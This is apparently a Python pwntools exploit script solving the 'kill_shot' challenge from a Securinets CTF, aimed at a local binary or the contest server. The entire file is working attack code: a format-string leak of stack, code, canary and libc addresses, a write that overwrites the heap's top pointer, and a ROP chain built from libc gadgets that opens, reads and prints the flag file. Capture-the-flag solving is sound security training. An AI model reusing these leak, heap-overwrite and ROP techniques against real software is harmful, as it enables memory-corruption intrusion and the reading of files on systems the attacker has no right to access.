#!/usr/bin/python3

from pwn import *
import sys

context.arch = 'amd64'

# BIN = './kill_shot'
BIN = './K'
LIB = './libc.so.6'
e = ELF(BIN)
l = ELF(LIB)

if len(sys.argv) > 1:
    r = remote('bin.q21.ctfsecurinets.com', 1338)
    fd = 5
else:
    r = process(BIN, env={"LD_PRELOAD": LIB})
    fd = 3

"""
6 -> stack
13 -> code
15 -> canary
25 -> libc
"""

r.sendafter('Format: ', '%6$p %13$p %15$p %25$p')
leak = r.recvuntil('Now', drop=True)
leak = leak.split(b' ')

stack = int(leak[0], 16)
code = int(leak[1], 16) - 0xd8c
canary = leak[2]
libc = int(leak[3], 16) - 0x21b97
fastbinY = libc + 0x3ebc50
top = libc + 0x3ebca0
ret = stack - 0xd8

info(f"""\
[*] stack = {hex(stack)}
[*] code = {hex(code)}
[*] canary = {canary}
[*] libc = {hex(libc)}
[*] fastbinY = {hex(fastbinY)}
[*] top = {hex(top)}
[*] ret = {hex(ret)}
""")

l.address = libc
buf = code + 0x202090
flag = ret + 0xa8
pop_rdi_ret = libc + 0x000000000002155f
pop_rsi_ret = libc + 0x0000000000023e8a
pop_rdx_ret = libc + 0x0000000000001b96
"""
openat(AT_FDCWD, "/home/ctf/flag.txt", O_RDONLY) == openat(-100, "/home/ctf/flag.txt", 0)
read(3, buf, 30)
write(1, buf, 30)
"""
ROP = flat(
    pop_rdi_ret, -100, pop_rsi_ret, flag, pop_rdx_ret, 0, l.sym['openat'],
    pop_rdi_ret, fd, pop_rsi_ret, buf, pop_rdx_ret, 0x50, l.sym['read'],
    pop_rdi_ret, 1, pop_rsi_ret, buf, pop_rdx_ret, 0x50, l.sym['write']
)

r.sendafter('Pointer: ', str(top))
r.sendafter('Content: ', p64(ret-0x10))

r.sendafter('3- exit', '1')
r.sendafter('Size: ', str(1000))
r.sendafter('Data: ', ROP + b"/home/ctf/flag.txt\x00")

r.sendafter('3- exit', '3')

r.interactive()
